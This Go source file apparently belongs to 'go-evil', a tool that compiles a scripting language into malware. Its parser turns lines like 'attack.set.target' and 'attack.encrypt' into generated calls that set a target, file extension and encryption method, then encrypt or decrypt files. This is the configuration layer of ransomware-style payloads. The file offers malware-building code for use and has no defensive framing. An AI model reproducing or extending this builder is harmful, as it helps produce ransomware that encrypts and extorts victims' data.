package attack_vector

import (
	"fmt"
	"regexp"

	"github.com/s9rA16Bf4/go-evil/utility/contains"
	"github.com/s9rA16Bf4/go-evil/utility/error"
	"github.com/s9rA16Bf4/go-evil/utility/json"
)

const (
	EXTRACT_SUBDOMAIN = "(attack)\\.(.+)\\.(.+)\\(.*\\);" // Captures subdomain and function
	EXTRACT_FUNCTION  = "(attack)\\.(.+)\\(.*\\);"        // This is for the cases when we don't have a subdomain
)

func Parse(base_64_serialize_json string) string {
	data_structure := json.Receive(base_64_serialize_json)
	data_structure.Append_to_call("attack_vector.Parse()")

	for _, line := range data_structure.File_gut {
		value := contains.Passed_value(line)

		regex := regexp.MustCompile(EXTRACT_SUBDOMAIN)
		result := regex.FindAllStringSubmatch(line, -1)

		if len(result) > 0 { // There is a subdomain to extract
			subdomain := result[0][2]
			function := result[0][3]

			switch subdomain {
			case "set":
				switch function {
				case "hash":
					Set_hash(value)
				case "extension":
					data_structure.Append_imported_domain("attack_encrypt")
					data_structure.Append_malware_gut(fmt.Sprintf("attack_encrypt.SetExtension(\"%s\")", value))
				case "target":
					data_structure.Append_imported_domain("attack_encrypt")
					data_structure.Append_malware_gut(fmt.Sprintf("attack_encrypt.SetTarget(\"%s\")", value))
				case "encryption":
					data_structure.Append_imported_domain("attack_encrypt")
					data_structure.Append_malware_gut(fmt.Sprintf("attack_encrypt.SetEncryptionMethod(\"%s\")", value))

				default:
					error.Function_error(function, "attack_vector.Parse()")
				}
			default:
				error.Subdomain_error(function, "attack_vector.Parse()")

			}
		} else { // There might be a function which doesn't require a subdomain to work
			regex = regexp.MustCompile(EXTRACT_FUNCTION)
			result = regex.FindAllStringSubmatch(line, -1)
			if len(result) > 0 {
				function := result[0][2]

				switch function {
				case "hash":
					Hash(value)
				case "encrypt":
					data_structure.Append_imported_domain("attack_encrypt")
					data_structure.Append_malware_gut("attack_encrypt.Encrypt()")
				case "decrypt":
					data_structure.Append_imported_domain("attack_encrypt")
					data_structure.Append_malware_gut("attack_encrypt.Decrypt()")
				default:
					error.Function_error(function, "attack_vector.Parse()")
				}
			}
		}
	}

	return json.Send(data_structure)
}
